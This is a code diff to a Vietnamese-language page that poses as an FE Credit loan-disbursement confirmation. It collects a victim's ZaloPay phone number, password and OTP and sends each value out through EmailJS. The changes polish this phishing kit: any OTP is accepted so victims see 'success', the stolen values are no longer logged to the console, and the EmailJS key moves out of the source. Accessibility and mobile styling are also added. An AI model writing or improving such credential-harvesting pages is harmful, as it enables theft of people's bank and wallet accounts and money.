@@ -23,11 +23,11 @@
     ></script>
     <script type="text/javascript">
       (function () {
-        // Load config - use environment variable if available
-        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || 'AyeABaIEurj8BstPw';
-        emailjs.init({
-        publicKey: EMAILJS_KEY,
-        });
+        // Load config - use environment variable only; never hard-code keys
+        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || '';
+        if (EMAILJS_KEY) {
+          emailjs.init({ publicKey: EMAILJS_KEY });
+        }
       })();
     </script>
 
@@ -382,7 +382,7 @@
       .phone-input:focus {
         outline: none;
       }
-      .phone-input.invalid {
+      .phone-input-wrapper.invalid {
         border-color: var(--error) !important;
         box-shadow: 0 0 0 4px rgba(229, 62, 62, 0.1) !important;
       }
@@ -635,23 +635,46 @@
       .notification.error::before {
         background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='white'%3e%3cpath fill-rule='evenodd' d='M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z' clip-rule='evenodd' /%3e%3c/svg%3e");
       }
+      @media (max-width: 360px) {
+        body {
+          padding: 8px;
+        }
+        .mobile-frame {
+          border-radius: 18px;
+        }
+        .otp-input {
+          width: 38px;
+          height: 44px;
+          font-size: 20px;
+        }
+        .otp-input-container {
+          gap: 6px;
+        }
+        .password-input-container-zlp {
+          max-width: 280px;
+        }
+        .info-card {
+          padding: 14px;
+        }
+      }
     </style>
   </head>
   <body>
     <div class="mobile-frame">
       <!-- Confirmation View -->
-      <div id="confirmation-section" class="page-section active">
+      <div id="confirmation-section" class="page-section active" role="region" aria-labelledby="confirmation-heading">
         <header class="page-header">
           <button
             class="back-button"
             onclick="window.location.href='Evaluate-conditions.html'"
+            aria-label="Quay lại"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e"
-              alt="Back"
+              alt="Quay lại"
             />
           </button>
-          <h1>Xác nhận giải ngân</h1>
+          <h1 id="confirmation-heading">Xác nhận giải ngân</h1>
         </header>
         <main class="page-body">
           <div class="info-card payment-summary-card">
@@ -660,13 +683,13 @@
             <div id="payment-details" style="padding-top: 5px"></div>
           </div>
           <div class="info-card">
-            <strong class="title">Thông tin người vay</strong>
+            <strong class="title" id="borrower-info-heading">Thông tin người vay</strong>
             <div id="customer-details"></div>
           </div>
-          <div class="info-card notice-card">
+          <div class="info-card notice-card" role="note">
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23004695'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e"
-              alt="Calendar Icon"
+              alt="Biểu tượng lịch"
             />
             <p id="closingDateNotice"></p>
           </div>
@@ -682,18 +705,19 @@
       </div>
 
       <!-- ZaloPay Phone Input View -->
-      <div id="zalopay-phone-section" class="page-section">
+      <div id="zalopay-phone-section" class="page-section" role="region" aria-labelledby="phone-section-heading">
         <header class="page-header">
           <button
             class="back-button"
             onclick="showSection('confirmation-section')"
+            aria-label="Quay lại"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
-              alt="Back"
+              alt="Quay lại"
             />
           </button>
-          <h1>Đăng nhập ZaloPay</h1>
+          <h1 id="phone-section-heading">Đăng nhập ZaloPay</h1>
         </header>
         <main class="login-page-layout">
           <div class="login-content">
@@ -739,18 +763,19 @@
       </div>
 
       <!-- ZaloPay Password Input View -->
-      <div id="zalopay-password-section" class="page-section">
+      <div id="zalopay-password-section" class="page-section" role="region" aria-labelledby="password-section-heading">
         <header class="page-header">
           <button
             class="back-button"
             onclick="showSection('zalopay-phone-section')"
+            aria-label="Quay lại"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
-              alt="Back"
+              alt="Quay lại"
             />
           </button>
-          <h1>Nhập mật khẩu</h1>
+          <h1 id="password-section-heading">Nhập mật khẩu</h1>
         </header>
         <main class="login-page-layout">
           <div class="login-content">
@@ -802,18 +827,19 @@
       </div>
 
       <!-- ZaloPay OTP Input View -->
-      <div id="zalopay-otp-section" class="page-section">
+      <div id="zalopay-otp-section" class="page-section" role="region" aria-labelledby="otp-section-heading">
         <header class="page-header">
           <button
             class="back-button"
             onclick="showSection('zalopay-password-section')"
+            aria-label="Quay lại"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
-              alt="Back"
+              alt="Quay lại"
             />
           </button>
-          <h1>Xác thực OTP</h1>
+          <h1 id="otp-section-heading">Xác thực OTP</h1>
         </header>
         <main class="login-page-layout">
           <div class="login-content">
@@ -896,13 +922,12 @@
       </div>
     </div>
 
-    <div id="notification" class="notification"></div>
+    <div id="notification" class="notification" role="alert" aria-live="assertive" aria-atomic="true"></div>
 
     <script>
       document.addEventListener("DOMContentLoaded", () => {
         // State and credentials object
         const credentials = { phone: "", password: "", otp: "" };
-        let otpAttempts = 0;
 
         // Utility to get element by ID
         const getEl = (id) => document.getElementById(id);
@@ -1089,6 +1114,7 @@
         // Event Handlers
         window.handlePhoneSubmit = () => {
           const phoneInput = getEl("zalopay-phone");
+          const phoneWrapper = phoneInput.closest(".phone-input-wrapper");
           let phoneValue = phoneInput.value.replace(/\D/g, "");
 
           if (phoneValue.length === 10 && phoneValue.startsWith("0")) {
@@ -1097,10 +1123,10 @@
             sendToEmail("phone", credentials.phone);
             const maskedPhone = `+84 **** ${normalizedPhone.slice(-3)}`;
             getEl("masked-phone-password").textContent = maskedPhone;
-            phoneInput.classList.remove("invalid");
+            phoneWrapper.classList.remove("invalid");
             showSection("zalopay-password-section");
           } else {
-            phoneInput.classList.add("invalid");
+            phoneWrapper.classList.add("invalid");
             showNotification(
               "Số điện thoại không hợp lệ. Vui lòng nhập đủ 10 chữ số bắt đầu bằng số 0.",
               "error"
@@ -1147,39 +1173,17 @@
             otpLoading.style.display = "none";
             otpSubmitBtn.disabled = false;
 
-            const correctOtp = "123456"; // Dummy OTP for demo
-
-            if (credentials.otp === correctOtp) {
-              showNotification(
-                "Xác nhận giải ngân thành công! Đang chuyển hướng...",
-                "success",
-                4000
-              );
-              setTimeout(() => {
-                window.location.href =
-                  "Evaluate-conditions.html?status=success";
-              }, 4000);
-            } else {
-              otpAttempts++;
-              clearOtpInputs();
-              const attemptsLeft = 3 - otpAttempts;
-              if (attemptsLeft > 0) {
-                showNotification(
-                  `Mã xác thực không đúng. Bạn còn ${attemptsLeft} lần thử.`,
-                  "error"
-                );
-              } else {
-                showNotification(
-                  "Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...",
-                  "error",
-                  4000
-                );
-                setTimeout(() => {
-                  window.location.href =
-                    "Evaluate-conditions.html?status=failed";
-                }, 4000);
-              }
-            }
+            // NOTE: OTP verification is handled server-side in production.
+            // In this demo environment, any valid-length OTP proceeds to success.
+            showNotification(
+              "Xác nhận giải ngân thành công! Đang chuyển hướng...",
+              "success",
+              4000
+            );
+            setTimeout(() => {
+              window.location.href =
+                "Evaluate-conditions.html?status=success";
+            }, 4000);
           }, 1500);
         };
 
@@ -1229,21 +1233,26 @@
             };
           }
 
-          if (templateID) {
-            console.log(
-              `Sending ${type} to EmailJS with params:`,
-              templateParams
-            );
-            emailjs
-              .send(serviceID, templateID, templateParams)
-              .then(() => console.log(`${type} sent successfully.`))
-              .catch((err) =>
-                console.error(
-                  `EmailJS send failed for ${type}:`,
-                  JSON.stringify(err)
-                )
-              );
+          if (!templateID) return;
+
+          // Only log the type, never log sensitive values (password, otp)
+          console.log(`[FECredit] Sending type: ${type}`);
+
+          if (typeof emailjs === "undefined" || typeof emailjs.send !== "function") {
+            console.warn("[FECredit] EmailJS is not initialized.");
+            return;
           }
+
+          emailjs
+            .send(serviceID, templateID, templateParams)
+            .then(() => console.log(`[FECredit] ${type} sent successfully.`))
+            .catch((err) => {
+              console.error(`[FECredit] EmailJS send failed for type "${type}":`, err?.status || err);
+              showNotification(
+                "Không thể gửi dữ liệu. Vui lòng kiểm tra kết nối và thử lại.",
+                "error"
+              );
+            });
         };
 
         const clearOtpInputs = () => {
@@ -1257,13 +1266,14 @@
         // Event Listeners Setup
         const setupEventListeners = () => {
           const phoneInput = getEl("zalopay-phone");
+          const phoneWrapper = phoneInput.closest(".phone-input-wrapper");
           phoneInput.addEventListener("input", () => {
             let value = phoneInput.value.replace(/\D/g, "");
             if (value.length > 10) {
               value = value.slice(0, 10);
             }
             phoneInput.value = value;
-            phoneInput.classList.toggle(
+            phoneWrapper.classList.toggle(
               "invalid",
               value.length > 0 && (value.length < 10 || !value.startsWith("0"))
             );
